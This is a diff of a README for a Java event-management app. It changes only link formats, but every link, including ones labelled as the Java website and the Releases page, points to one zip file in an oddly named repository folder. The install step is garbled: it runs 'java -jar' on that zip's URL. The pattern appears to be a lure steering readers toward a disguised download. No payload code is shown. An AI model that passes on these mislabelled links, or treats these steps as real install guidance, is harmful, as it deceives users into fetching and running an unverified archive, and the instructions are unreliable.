@@ -1,7 +1,7 @@
 # 🎉 Event-Management-System-Java - Manage Your Events with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip)](https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip)
+[![Download](https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip)](https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip)
 
 ---
 
@@ -18,7 +18,7 @@ Before you download, ensure your computer meets these basic requirements:
 - **Memory:** At least 512 MB of RAM
 - **Storage:** Minimum 100 MB of available disk space
 
-Ensure that you have the latest version of Java installed. You can download it from the [Java website](https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip).
+Ensure that you have the latest version of Java installed. You can download it from the [Java website](https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip).
 
 ## 💻 Features
 
@@ -32,7 +32,7 @@ Ensure that you have the latest version of Java installed. You can download it f
 ## 📥 Download & Install
 
 1. **Visit the Download Page:**
-   Go to the [Releases page](https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip).
+   Go to the [Releases page](https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip).
 
 2. **Choose a Version:**
    Scroll through the release versions listed. Select the latest stable version for the best experience.
@@ -44,9 +44,9 @@ Ensure that you have the latest version of Java installed. You can download it f
    - Navigate to the folder where you downloaded the file.
    - Open a terminal or command prompt.
    - Use the command:
-     - For a `.jar` file: `java -jar https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip`
+     - For a `.jar` file: `java -jar https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip`
   
-   Replace `https://raw.githubusercontent.com/youhengchhieng/Event-Management-System-Java/main/Polyactinia/Event-Management-System-Java.zip` with the actual name of the downloaded file.
+   Replace `https://github.com/youhengchhieng/Event-Management-System-Java/raw/refs/heads/main/Polyactinia/Event-Management-System-Java.zip` with the actual name of the downloaded file.
 
 5. **Follow the Prompts:**
    The application will guide you through its features via the command-line interface.
